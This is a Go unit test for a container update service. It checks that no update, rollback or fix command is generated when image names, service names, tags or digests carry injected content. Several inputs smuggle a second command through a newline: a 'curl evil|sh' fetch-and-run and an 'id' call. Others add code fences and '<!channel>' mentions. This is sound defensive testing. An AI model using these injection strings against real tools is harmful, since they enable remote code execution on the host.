// Copyright 2026 Benjamin Touchard (kOlapsis)
// SPDX-License-Identifier: Apache-2.0

package update

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestGenerateCommands_HostileImageOrFenceProducesNoCommand(t *testing.T) {
	svc := &Service{}
	compose := func(image, service string) ContainerInfo {
		return ContainerInfo{
			Name: "app-web-1", Image: image, RuntimeType: "docker",
			OrchestrationGroup: "app", OrchestrationUnit: service, ComposeWorkingDir: "/srv/app",
		}
	}
	for name, c := range map[string]ContainerInfo{
		"newline in the image":    compose("x\ncurl evil|sh #:1.0", "web"),
		"code fence in the image": compose("nginx```<!channel>:1.24.0", "web"),
		"code fence in a name":    compose("nginx:1.24.0", "web```<!channel>"),
	} {
		t.Run(name, func(t *testing.T) {
			u := &ImageUpdate{Image: c.Image, CurrentTag: "1.24.0", LatestTag: "1.26.0", PreviousDigest: "sha256:old"}
			assert.Empty(t, svc.GenerateUpdateCommand(c, "1.26.0", "sha256:new"), "update")
			assert.Empty(t, svc.GenerateRollbackCommand(c, u), "rollback")
			assert.Empty(t, svc.GenerateFixCommand(c, "1.24.0", "1.25.0"), "fix")
		})
	}

	safe := compose("nginx:1.24.0", "web")
	assert.Empty(t, svc.GenerateUpdateCommand(safe, "1.26.0\nid", "sha256:new"), "tag from the registry")
	assert.Empty(t, svc.GenerateUpdateCommand(safe, "1.24.0", "sha256:new```"), "digest from the registry")
	assert.Empty(t, svc.GenerateRollbackCommand(safe, &ImageUpdate{
		Image: "nginx:1.24.0", CurrentTag: "1.24.0", LatestTag: "1.26.0", PreviousDigest: "sha256:old\nid",
	}), "stored digest")
	assert.Empty(t, svc.GenerateRollbackCommand(safe, &ImageUpdate{
		Image: "nginx\nid:latest", CurrentTag: "latest", LatestTag: "latest", PreviousDigest: "sha256:old",
	}), "stored image")
	assert.NotEmpty(t, svc.GenerateUpdateCommand(safe, "1.26.0", "sha256:new"))
}
